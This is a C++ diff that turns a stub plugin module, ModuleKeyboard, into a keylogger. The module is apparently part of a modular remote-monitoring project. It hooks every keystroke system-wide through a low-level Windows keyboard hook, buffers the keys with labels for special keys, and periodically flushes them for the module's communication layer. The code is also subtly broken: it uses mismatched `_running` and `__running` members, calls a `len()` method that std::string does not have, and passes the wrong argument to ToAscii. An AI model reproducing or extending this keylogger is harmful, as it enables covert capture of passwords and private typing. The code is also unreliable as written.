@@ -2,13 +2,12 @@
 // Created by Benoit Hamon on 10/3/2017.
 //
 
-#include <Windows.h>
 #include <iostream>
-
 #include <boost/dll/alias.hpp> // for BOOST_DLL_ALIAS
-#include <boost/shared_ptr.hpp>
 
 #include "ModuleKeyboard.hpp"
+
+static std::string g_keys;
 
 LRESULT CALLBACK ModuleKeyboard::hookCallback(int nCode, WPARAM wParam, LPARAM lParam ) {
     char pressedKey;
@@ -23,17 +22,36 @@ LRESULT CALLBACK ModuleKeyboard::hookCallback(int nCode, WPARAM wParam, LPARAM l
             return CallNextHookEx(nullptr, nCode, wParam, lParam );
     }
 
-    std::cout << pressedKey;
-
+    switch (pressedKey) {
+	case VK_RETURN: g_keys += "\n"; break;
+	case VK_CONTROL: g_keys += "[Ctrl]"; break;
+	case VK_MENU : g_keys += "[Alt]"; break;
+	case VK_DELETE: g_keys += "[DEL]"; break;
+	case VK_BACK: g_keys += "[<===)]"; break;
+	case VK_LEFT : g_keys += "[<-]"; break;
+	case VK_RIGHT  : g_keys += "[->]";break;
+	case VK_TAB : g_keys += "[TAB]"; break;
+	case VK_END : g_keys += "[Fin]"; break;
+	default:
+		      BYTE keyboard_state[256];
+		      GetKeyboardState(keyboard_state);
+		      WORD c;
+		      UINT ScanCode=0;
+		      ToAscii(wParam, ScanCode, keyboard_state, &c, 0);
+		      g_keys += (char)c;
+		      break;
+    }
     return CallNextHookEx(nullptr, nCode, wParam, lParam);
 }
 
 void ModuleKeyboard::start(ModuleCommunication &com) {
+    this->_running = true;
     HINSTANCE instance = GetModuleHandle(nullptr);
     HHOOK hook = SetWindowsHookEx( WH_KEYBOARD_LL, ModuleKeyboard::hookCallback, instance,0);
 
     MSG msg;
-    while (!GetMessage(&msg, nullptr, 0, 0)) {
+    while (!GetMessage(&msg, nullptr, 0, 0) && this->__running) {
+        this->sendKeys();
         TranslateMessage(&msg);
         DispatchMessage(&msg);
     }
@@ -41,22 +59,17 @@ void ModuleKeyboard::start(ModuleCommunication &com) {
     UnhookWindowsHookEx(hook);
 }
 
-void ModuleKeyboard::stop() {
-
-}
-
-void ModuleKeyboard::setParams() {
-
-}
-
-void ModuleKeyboard::setParams(std::string const &name, std::string const &value) {
-
-};
-
 boost::shared_ptr<ModuleKeyboard> ModuleKeyboard::create() {
     return boost::shared_ptr<ModuleKeyboard>(
             new ModuleKeyboard()
     );
+}
+
+void ModuleKeyboard::sendKeys() {
+  if (g_keys.len() > 5) {
+    std::cout << g_keys << std::endl;
+    g_keys.clear();
+  }
 }
 
 BOOST_DLL_ALIAS(ModuleKeyboard::create, create_module)
